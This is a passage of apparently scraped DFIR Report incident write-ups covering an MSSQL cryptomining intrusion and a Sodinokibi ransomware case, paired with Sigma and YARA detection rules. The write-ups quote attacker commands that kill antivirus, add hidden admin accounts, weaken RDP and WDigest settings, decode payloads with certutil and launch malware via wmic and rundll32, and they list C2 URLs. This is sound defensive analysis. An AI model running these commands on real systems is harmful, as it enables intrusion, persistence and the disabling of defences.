captures this as an `xp_cmdshell` event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using `taskkill` for various anti-virus software.\n\n### Commands to kill AV processes:\n\n```\ntaskkill /f /im egui.exe\ntaskkill /f /im QQPCTray.exe\ntaskkill /f /im SafeDogGuardCenter.exe\ntaskkill /f /im 360safe.exe\ntaskkill /f /im net1895.exe\ntaskkill /f /im ekrn.exe\ntaskkill /f /im 360rp.exe\ntaskkill /f /im QQPCMgr.exe\ntaskkill /f /im SafeDogServerUI.exe\ntaskkill /f /im SafeDogSiteIIS.exe\n```\n\nThe threat actors also favored the execution of batch scripts on the compromised host. They used `xp_cmdshell` to write a batch script (`1.bat`) to disk by redirecting strings to the file using `echo` commands.\n\n```image\nAlt: Batch Script Creation\nDescription: The image displays a table detailing a process execution log from a cybersecurity incident. It includes columns for 'Initiating Process File Name', 'Action Type', 'Initiating Process Command Line', 'Initiating Process Account Name', and 'File Name'. The table shows that 'cmd.exe' initiated a file creation action, specifically creating a batch file named '1.bat'. The command line executed involves various administrative commands, such as adding a user to local groups and modifying registry entries.\nTranscription: |\n  | Initiating Process File Name | Action Type | Initiating Process Command Line| Initiating Process Account Name | File Name |\n  | ---------------------------- | ----------- || ------------------------------- | --------- |\n  | cmd.exe                      | FileCreated | \"cmd.exe\" /c (echo NET USER Admin\\$ !67hC5140Rvg /ADD /expires:never & echo NET LOCALGROUP Administrators /ADD Admin\\$ & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SpecialAccounts\\Userlist /t REG_DWORD /d 0 & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f & echo reg add \"HKLM\\LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo NET LOCALGROUP Administrators /ADD Admin\\$ & echo NET LOCALGROUP Administrators /ADD Admin\\$ > %USERPROFILE%\\AppData\\1.bat | mssql$sqlexpress                | 1.bat     |\n```\n\nA second set of commands was also echoed into a file named `bigfile.txt`. Once complete, `certutil` was used to decode the text and create an executable file.\n\n### Certutil command:\n\n```\ncmd.exe /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe\n```\n\nThis executable was then used in executing the `1.bat` batch file.\n\n### Command to execute batch file:\n\n```\ncmd.exe /c %USERPROFILE%\\AppData\\bigfile.exe -i -c %USERPROFILE%\\AppData\\1.bat\n```\n\nPulling the hash of the file that was written matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: \nhttps://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n\n```image\nAlt: THOR Scanner\nDescription: The image displays a screenshot from the THOR APT Scanner, detailing YARA signature matches for various hacking tools and indicators. It includes specific rules like 'Hacktool_Inject_Incognito' and 'Hacktool_Privilege_Escalation_Jan22_1,' with links to their descriptions and detection information. Detection timestamps and AV detection rates (e.g., 8/67) are also provided, indicating the effectiveness of the rules in identifying malicious activity.\nTranscription: |\n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Inject_Incognito\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Inject_Incognito\n  DESCRIPTION: Detects hacktool incognito\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_inject_incognito\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Incognito_av\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Incognito_av\n  DESCRIPTION: Detects Hacktool Incognito Av\n  REFERENCE: https://www.virustotal.com/en/file/18e64d4c240f6481e7bd542f6c8acc802549d437ec0018e10a3b0b6f675d/analysis/\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 8 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_incognito_av\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTK_Inject_Privilege_Escalation_Jan22_1\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTK_Inject_Privilege_Escalation_Jan22_1\n  DESCRIPTION: Detects a hacktool that seems to provide privilege escalation vectors\n  RULE_AUTHOR: Florian Roth\n  \n  👋 Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/KaLendis/CVE-2022-21882/issues ❤️.\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n```\n\nWe believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\n\n---\n\n## Persistence\n\nThe threat actors wrote a batch script (`1.bat`) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\n\n### Commands to create and add user:\n```\nNET USER Adminv$ !67hCS14ORVg /ADD /expires:never\nNET LOCALGROUP Administrators /ADD Adminv$\n```\n\nThey also made remote RDP connections possible by changing the `fDenyTSConnections` and `UserAuthentication` values to `0`.\n\n### Commands to enable RDP:\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\n```\n\nThe full contents of `1.bat` also included commands to hide the user account by adding it to the registry using \"Special Accounts\".\n\n### Command to hide user account:\n```\nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v Adminv$ /t REG_DWORD /d 0\n```\n\n---\n\n## Credential Access\n\nDuring the initial access, credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n\n---\n\n## Command and Control\n\nWe observed that the domain `mymst007[.]info` is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n\n```image\nAlt: Connections\nDescription: The image is a detailed diagram illustrating the connections and communications related to the domain 'mymst007.info'. It includes nodes representing contacted IPs, domains, downloaded files, and URLs, along with specific filenames such as 'CSRSS.exe' and 'weixin.html'. The diagram visually maps out the relationships and interactions between these elements, highlighting the command and control infrastructure associated with the observed cyber attacks.\nTranscription: |\n  - Resolutions\n    - mst.mymst007.info\n    - mst2.mymst007.info\n  - Siblings\n  - Contacted ips\n  - Contacted domains\n  - Communicating files\n  - Downloaded files\n    - weixin.html\n  - Referrer files\n    - 3f14dc75982f1abd67e66623c5c8277b8d109be96b6f8fef92e4c0be7b2c9b1\n    - wrmi-instance-script.txt (1e4fdd4670ddb98286ed18bb3940c812215b2e5bda0886589e397667000391f)\n    - 563d381d5f8c7fecc6bd8e228cdf8beccab81fe5b1cfb29ddc34dc779e70e1\n    - 1c496854a393f70196745be19e47d758d50df22e2ed3c247a2008576105f\n  - Contacted urls\n    - http://mst2.mymst007.info/\n    - http://mst2.mymst007.info:4000/ver\n    - http://mst.mymst007.info/\n    - http://mst.mymst007.info:8080/all.dll.asp\n    - http://mst.mymst007.info/perp2017/home2/pergavr2017/a.exe\n  - CSRSS.exe\n```\n\n---\n\n## Impact\n\nThe impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pools such as `minergate[.]com`.\n\n---\n\n## Indicators\n\n### File\n\n```\nWinRing0x64.sys\n0c0195c48b6b8582fa6f6373032118da\nd25340ae8e92a6d29f599fef426a2bc1b5217299\n11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5\n\nex.exe\na7bafac5ed29a68e0fff6eecc3f5bb3f\n4f19b6970e35b3d20f84a91e3af0d82c68096710\n428d06c889b17d5f95f9df952fc13b1cdd8ef520c51e2abff2f9192aa78a4b24\n\nkit.bat\n91931a2b1ae645004023e1b35fe57314\n9f5a7a293c92ef42374cf1471b653ed994446c15\n4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\n\nsmss.exe\ne579cd176b384b38eda6a0c61c51c274\n8a3b31ac12d9ac1a44707b1de75b8870189db83a\nd3c3f529a09203a839b41cd461cc561494b432d810041d71d41a66ee7d285d69\n\nxit\n88fba011db6e5122f4aa2c0343e11275\na2d34aeee2fb7c1ba57a11c03cc33e76f1217548\ncfa12bb31d58d30875b7a20ed05b5c100032b6a18802fbdf3913e70288e11a55\n\nxitmf\n0c8622c4871541e89d0173d5be0db8aa\nb01a88df39857417233d9bd3256f82d0fdcc63f8\nbeda317d74b8f1090e251205064e686d330a0502006a54dc94d528d6bd16c416\n```\n\n### Network\n\n```\nminergate[.]com\nmymst007[.]info\nbj87670@gmail.com\n```\n\n---\n\n## Detections\n\n### Sigma Rules\n\n- Suspicious Commands by SQL Server\n- MOFComp Execution\n- Hiding Local User Accounts\n\n### Yara Rules\n\n```\nrule miner_batch {\n   meta:\n      description = \"file kit.bat\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\"\n      date = \"2022/07/10\"\n      hash1 = \"4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\"\n   strings:\n      $a1 = \"%~dps0\" fullword ascii\n      $a2 = \"set app\" fullword ascii\n      $a3 = \"cd /d \\\"%~dps0\\\"\" fullword ascii\n      $a4 = \"set usr=jood\" fullword ascii\n      $s1 = \"schtasks /run\" fullword ascii\n      $s2 = \"schtasks /delete\" fullword ascii\n      $a5 = \"if \\\"%1\\\"==\\\"-s\\\" (\" fullword ascii\n   condition:\n      uint16(0) == 0xfeff and filesize < 1KB and\n      3 of ($a*) and 1 of ($s*)\n}\n```\n\n---\n\n## MITRE Techniques\n\n```\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1136.001 - Create Account: Local Account\nT1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription\nT1564.002 - Hide Artifacts: Hidden Users\nT1059.003 - Command and Scripting Interpreter: Windows Command Shell\nT1027.004 - Obfuscated Files or Information: Compile After Delivery\nT1110.001 - Brute Force: Password Guessing\nT1070.004 - Indicator Removal on Host: File Deletion\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1546.012 - Event Triggered Execution: Image File Execution Options Injection\nT1140 - Deobfuscate/Decode Files or Information\nT1112 - Modify Registry\nT1078 - Valid Accounts\nT1134.001 - Token Impersonation/Theft\n```",
    "sigma_rule": {
      "title": "Hiding User Account Via SpecialAccounts Registry Key",
      "id": "f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd",
      "related": [
        {
          "id": "8a58209c-7ae6-4027-afb0-307a78e4589a",
          "type": "obsolete"
        },
        {
          "id": "9ec9fb1b-e059-4489-9642-f270c207923d",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects modifications to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen.",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
        "https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1564.002/T1564.002.md"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2022-07-12",
      "modified": "2023-01-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.002"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventType": "SetValue",
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_special_accounts.yml",
    "id": "1016"
  },
  {
    "url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
    "markdown": "# Sodinokibi (aka REvil) Ransomware\n\n**Categories:**\nadfind\ncobaltstrike\nicedid\nransomware\nrevil\nSodinokibi\n\n**Published on:** March 29, 2021\n\n### Intro\n\nSodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50 million ransom demand.\n\nIn March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat actors escalated privileges to Domain Administrator, exfiltrated data, and used Sodinokibi to ransom all domain joined systems.\n\n### Case Summary\n\nThe IcedID trojan was first discovered in 2017 and currently operates as an initial access broker for several ransomware families. In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.\n\nPersistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution. About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used throughout the intrusion. Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers. We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID. #ArtifactsMatter. It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.\n\nAfter compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service. The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.\n\nAdditional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems. After discovery was completed, credentials were dumped from lsass. After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.\n\nThree and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.\n\nAt the four hour mark, the threat actors began to move on to final objectives. They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain. After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag `-smode`, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking. Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot.\n\nBooting into Safe Mode with Networking blocked the startup of security tools and other management agents. Networking worked, but because services couldn’t start, we were unable to remotely manage the systems using our normal tools. We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.\n\nOn certain systems, ransomware was executed without the `-smode` flag, and on other systems a dll was executed via `rundll32` to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.\n\nAbout 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems. The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days. If we didn’t pay within 7 days the price goes up to around $400k. The ransom is required to be paid in Monero instead of the usual Bitcoin. This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis. The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.\n\n### Services\n\nOur Threat Feed service picked up one of the two Cobalt Strike servers one day before this intrusion occurred and the other IP was added to the feed as soon as we recognized it.\n\nWe also have artifacts available from this case such as ransomware samples (dll and exe), pcaps, memory captures, files, Kape packages and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a timeline detailing the events related to the Sodinokibi (REvil) ransomware attack. It outlines specific actions taken by threat actors, including the initial execution of IcedID, lateral movements to various servers, exfiltration of files, and the deployment of ransomware, along with the corresponding times and types of connections made during the attack. Each event is represented in a structured format, showing the progression of the attack over time.\nTranscription: |\n  Sodinokibi (aka REvil) Ransomware\n  \n  18:05 UTC Initial IcedID execution on beach head host\n  C2 connection: 161.35.109.168:443\n  \n  18:06 IcedID discovery initiated on host\n  \n  19:21 Cobalt Strike Beacons executed on beach head host\n  C2 connection: 45.86.163.78:443 cloudmetric.online\n  C2 connection: 195.189.99.74:443 smalleststores.com\n  \n  19:30 Lateral movement to Exchange server using Cobalt Strike\n  \n  19:53 Lateral movement to domain controller from Exchange server\n  \n  20:45 Threat actors begin moving laterally using RDP\n  \n  21:35 Exfiltration of files using Rclone\n  C2 connection: 45.147.160.5:443\n  \n  22:06 First deployment of ransomware using BITSAdmin\n  \n  22:07 Execution of Sodinokibi ransomware with -s mode flag by threat actor over RDP connection\n  \n  22:28 Final ransomware deployment\n```\n\n### MITRE ATT&CK\n\n#### Initial Access\n\nInitial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.\n\nThe delivery format was an xlsm file:\n\nInitial execution of the document writes a file to:\n\n```\nC:\\Users\\Public\\microsoft.security\n```\n\nThe Excel file called wmic to execute the file with regsrv32:\n\n```\nwmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security'\n```\n\n```image\nAlt: wmic command\nDescription: The image displays a screenshot of a process list related to a cyber intrusion involving Sodinokibi (REvil) ransomware and IcedID malware. It shows the execution of Microsoft Excel, the WMIC command being used to create a process with regsvr32, and the path to a file located in the user's public directory. This information is relevant for understanding the steps taken in the malware's execution and the initial access method.\nTranscription: |\n  Processes\n  - C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\n    \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\" \"C:\\Users\\Admin\\AppData\\Local\\Temp\\Documents972.xlsm\"\n  \n  - C:\\Windows\\System32\\Wbem\\wmic.exe\n    wmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security'\n  \n  - C:\\Windows\\system32\\regsvr32.exe\n    regsvr32 -s C:\\Users\\Public\\microsoft.security\n```\n\nThis then made a network request to download a file from this URL:\n\n```\nhttp://vpu03jivmm03qncgx.com/index.gif\n```\n\nThe GIF however was the IcedID malware.\n\n```image\nAlt: IcedID\nDescription: The image displays an HTTP request log, specifically a GET request for an index.gif file. It includes headers such as 'Accept', 'User-Agent', 'Host', and 'Connection', as well as a response indicating a 200 OK status from an Apache server. The body of the response contains what appears to be corrupted or encoded data, hinting at the malicious content being delivered through the request.\n```\n\n#### Execution\n\nOnce IcedID was downloaded to the host, the malware was executed using `rundll32.exe`:\n\n```\nrundll32.exe \"C:\\Users\\USERNAME\\AppData\\Local\\Temp\\skull-x64.dat\",update /i:\"DwarfWing\\license.dat\"\n```\n\nAfter execution, the malware made contact with `161.35.109[.]168` which it continued to beacon to, throughout the intrusion.\n\n#### Persistence\n\nIcedID setup persistence on the beach head host using a scheduled task.\n\n```\nwewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n```\n\n```image\nAlt: Scheduled Task\nDescription: The image depicts an XML configuration file for a scheduled task, related to the Sodinokibi (REvil) ransomware. It includes various settings such as triggers, execution policies, and commands to run a malicious executable. The task is set to execute at a defined time with specific parameters, emphasizing its persistence mechanism on a Windows system. Key elements like 'LogonTrigger' and 'Command' indicate how the task is scheduled to maintain the ransomware's presence on the infected system.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n  <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n    <RegistrationInfo>\n      <URI>wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}</URI>\n    </RegistrationInfo>\n    <Triggers>\n      <TimeTrigger>\n        <Repetition>\n          <Interval>P1D</Interval>\n          <StopAtDurationEnd>false</StopAtDurationEnd>\n        </Repetition>\n        <StartBoundary>2012-01-01T12:00:00</StartBoundary>\n        <Enabled>true</Enabled>\n      </TimeTrigger>\n      <LogonTrigger>\n        <Enabled>true</Enabled>\n        <UserId/>\n      </LogonTrigger>\n    </Triggers>\n    <Settings>\n      <MultipleInstancesPolicy>IgnoreNew/MultipleInstancesPolicy</MultipleInstancesPolicy>\n      <DisallowStartOnBatteries>false</DisallowStartOnBatteries>\n      <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n      <AllowHardTerminate>false</AllowHardTerminate>\n      <StartWhenAvailable>true</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n        <Duration>P10M</Duration>\n        <WaitTimeout>P1H</WaitTimeout>\n        <StopOnIdleEnd>false</StopOnIdleEnd>\n        <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Hidden>false</Hidden>\n      <RunOnlyIfIdle>false</RunOnlyIfIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>P0S</ExecutionTimeLimit>\n      <Priority>7</Priority>\n    </Settings>\n    <Actions context=\"Author\">\n      <Exec>\n        <Command>rundll32.exe</Command>\n        <Arguments>\"C:\\Users\\AppData\\Roaming\\douxiy\\Ciocca.dll\",update /i:\"DwarfWing\\license.dat\"</Arguments>\n      </Exec>\n    </Actions>\n  </Task>\n```\n\n```image\nAlt: Registry Key\nDescription: The image displays a technical overview of a registry modification related to the Sodinokibi (REvil) ransomware. It shows the created registry key along with its path: 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}'. The registry modification section indicates the value type as '6', which is significant for understanding the persistence mechanism of the ransomware. Additionally, the image features a visual representation of processes such as wininit.exe, services.exe, and svchost.exe, implying the context of the executed ransomware environment.\nTranscription: |\n  wininit.exe\n  services.exe\n  svchost.exe\n  \n  created registry key\n  \n  Registry modification\n  \n  Registry key\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n  \n  Value type\n  6\n```\n\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}\n```\n\nThe execution of the ransomware executable created a RunOnce key for persistence.\n\n```\nHKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*AstraZeneca\n```\n\n```image\nAlt: RunOnce Key\nDescription: The image displays a log entry related to a Windows event, specifically detailing a registry modification made by a process. Key components include the 'details' showing the path of the executable, 'eventType' indicating a value set operation, and 'targetObject' which specifies the registry path where the modification occurred. This log entry illustrates the use of a RunOnce key for persistence by ransomware, linking to the mentioned AstraZeneca key.\nTranscription: |\n  details          C:\\Windows\\*\\*.exe\n  eventType        SetValue\n  image            C:\\Windows\\*\\*.exe\n  processGuid      {b093c253-dfa5-604f-3c07-000000001008}\n  processId        6512\n  ruleName         technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder\n  targetObject     HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca\n  utcTime          *\n  channel          Microsoft-Windows-Sysmon/Operational\n```\n\n#### Privilege Escalation\n\nAfter completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the `wuauclt.exe` process executed several PowerShell functions for UAC bypasses including:\n\n- UAC-TokenMagic\n- Invoke-SluiBypass\n\n#### Defense Evasion\n\nAbout one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.\n\n```image\nAlt: Cobalt Strike Servers\nDescription: The image is a flow diagram illustrating the connection between IcedID and Cobalt Strike. It depicts a command execution process using 'rundll32.exe' to run a specified file path, which leads to the creation of remote threads via 'Cmd.exe'. Various IP addresses and domain names are displayed, indicating the external servers contacted during the process. The diagram provides a clear visual representation of the malware's behavior and the specific commands executed, making it relevant to Cyber Threat Intelligence.\nTranscription: |\n  IcedID to Cobalt Strike\n  ----------------------------------------\n  rundll32.exe \"C:\\Users\\UserName\\AppData\\Local\\Temp\\skull-x64.dat\", update /i:\"DwarfWing\\license.dat\"\n      ├── Create Remote Thread Cmd.exe\n      │       └── 45.86.163.78:80\n      │               └── Explorer.exe\n      │                       ├── 45.86.163.78:443\n      │                       │       └── cloudmetric.online\n      │                       └── WUAUCLT.exe\n      └── Create Remote Thread Cmd.exe\n              └── 195.189.99.74:443\n                      └── smalleststores.com\n```\n\nProcess injection was used multiple times across the environment using Cobalt Strike Beacons.\n\n```image\nAlt: Process Injection\nDescription: The image displays a log entry related to a security alert about process injection. It includes specific details such as the rule name, timestamps, source and target process GUIDs, process IDs, and the associated images. This technical information indicates a potential security threat where one process is attempting to inject code into another, a common tactic used by malware.\nTranscription: |\n  \"CreateRemoteThread detected:\n  RuleName: technique_id=T1055, technique_name=Process Injection\n  UtcTime:\n  SourceProcessGuid: {4d5468e-bb44-604f-8219-000000000000}\n  SourceProcessId: 4208\n  SourceImage: C:\\Windows\\SysWOW64\\rundll32.exe\n  TargetProcessGuid: {4d5468e-4969-6047-1c00-000000000000}\n  TargetProcessId: 1412\n  TargetImage: C:\\Windows\\System32\\svchost.exe\n  NewThreadId: 3996\n  StartAddress: 0x00000000003D0003\n  StartModule: -\n  StartFunction: -\"\n```\n\nPrior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.\n\n```image\nAlt: GPO\nDescription: The image displays a detailed log of a process creation event related to the PowerShell technique within the MITRE ATT&CK framework. It includes various technical details such as RuleName, ProcessGuid, ProcessId, Image, and Description, indicating that the process is associated with Microsoft Management Console. Additional information includes command line parameters, parent process details, and hash values for integrity and verification. This log provides insights into the execution context and behavior of a potentially malicious process.\nTranscription: |\n  Process Create:\n    RuleName: technique id=T1059.001.technique_name=PowerShell\n    UtcTime:\n    ProcessGuid: {46d5468e-d592-604f-401a-000000000000}\n    ProcessId: 1572\n    Image: C:\\Windows\\System32\\mmc.exe\n    FileVersion:\n    Description: Microsoft Management Console\n    Product: Microsoft Windows® Operating System\n    Company: Microsoft Corporation\n    OriginalFileName: mmc.exe\n    CommandLine: \"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\gpmc.msc\"\n    CurrentDirectory: C:\\Users\\\n    User:\n    LogonGuid:\n    LogonId:\n    TerminalSessionId: 3\n    IntegrityLevel: High\n    Hashes:\n      SHA1: 715ABDA53ECDAD6A136F56A41A97444F24CA3195, MD5: 0ED2577AA82A3B1C155843F23B7E377D2\n    ParentProcessGuid: {46d5468e-d526-604f-341a-000000000000}\n    ParentProcessId: 5268\n    ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n    ParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n```\n\nThe GPO was named “new”.\n\n```image\nAlt: GPO Name\nDescription: The image displays a section of a Group Policy Object (GPO) configuration related to Windows Defender Antivirus. It shows the 'Computer Configuration (Enabled)' header, followed by 'Policies' and 'Administrative Templates.' Under 'Windows Components/Windows Defender Antivirus,' two policies are listed: 'Turn off routine remediation' and 'Turn off Windows Defender Antivirus,' both marked as 'Enabled.' This indicates that these settings were altered to disable essential security measures, likely in the context of a cyber threat scenario involving ransomware.\nTranscription: |\n  Computer Configuration (Enabled)\n  Policies\n    Administrative Templates\n      Policy definitions (ADMX files) retrieved from the local computer.\n        Windows Components/Windows Defender Antivirus\n          Policy                                 Setting\n          Turn off routine remediation           Enabled\n          Turn off Windows Defender Antivirus    Enabled\n```\n\n#### Credential Access\n\nCredentials were dumped on a server and domain controller using a Cobalt Strike Beacon.\n\n```image\nAlt: Credential Dump\nDescription: The image displays a detailed technical breakdown of two processes related to credential dumping, likely from a cybersecurity analysis of a ransomware incident. It includes information on the processes '2f092e6.exe' and 'lsass.exe,' showing attributes such as execution time, path, integrity level, access privileges, process ID, command line, and cryptographic hashes (SHA1 and SHA256) for 'lsass.exe.' The structure indicates a hierarchical representation of process relationships, providing insights into how the malware operates.\nTranscription: |\n  2f092e6.exe\n  - Process name: 2f092e6.exe\n  - Execution time: [REDACTED]\n  - Path: \\\\[REDACTED]\\ADMIN$\\2f092e6.exe\n  - Integrity level: System\n  - Access privileges (UAC): Default\n  - Process ID: 4836\n  - Command line: 2f092e6.exe\n  \n      rundll32.exe\n      └── wuauserv.exe\n          └── lsass.exe\n              - Process name: lsass.exe\n              - Execution time: [REDACTED]\n    